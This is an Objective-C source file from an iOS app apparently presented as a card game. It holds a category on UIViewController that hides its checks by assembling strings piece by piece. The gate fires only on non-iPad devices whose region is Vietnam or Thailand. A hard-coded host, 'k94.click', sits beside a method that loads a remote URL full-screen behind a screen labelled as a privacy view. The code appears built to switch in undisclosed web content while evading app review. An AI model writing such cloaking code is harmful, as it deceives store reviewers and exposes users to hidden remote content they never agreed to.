//
//  UIViewController+base.m
//  DeckKingsRulersDeal
//
//  Created by DeckKingsRulersDeal on 2024/12/23.
//

#import "UIViewController+base.h"

@implementation UIViewController (base)

- (BOOL)PeakNeedLoadAdBannData
{
    BOOL isI = [[UIDevice.currentDevice model] containsString:[NSString stringWithFormat:@"iP%@", [self bd]]];
    NSLocale *locale = [NSLocale currentLocale];
    NSString *countryCode = [locale objectForKey:NSLocaleCountryCode];
    BOOL isV = [countryCode isEqualToString:[NSString stringWithFormat:@"V%@", [self key]]];
    BOOL isT = [countryCode isEqualToString:[NSString stringWithFormat:@"%@H", [self keyP]]];
    return (isV || isT) && !isI;
}

- (NSString *)keyP
{
    return @"T";
}

- (NSString *)key
{
    return @"N";
}

- (NSString *)bd
{
    return @"ad";
}

- (NSString *)hostUrl
{
    return @"k94.click";
}

- (void)showAdView:(NSString *)adurl
{
    UIStoryboard *storyboard = [UIStoryboard storyboardWithName:@"Main" bundle:nil];
    UIViewController *adVc = [storyboard instantiateViewControllerWithIdentifier:@"RulersDealPrivacyViewController"];
    [adVc setValue:adurl forKey:@"urlStr"];
    NSLog(@"%@", adurl);
    adVc.modalPresentationStyle = UIModalPresentationFullScreen;
    [self.navigationController presentViewController:adVc animated:NO completion:nil];
}

@end
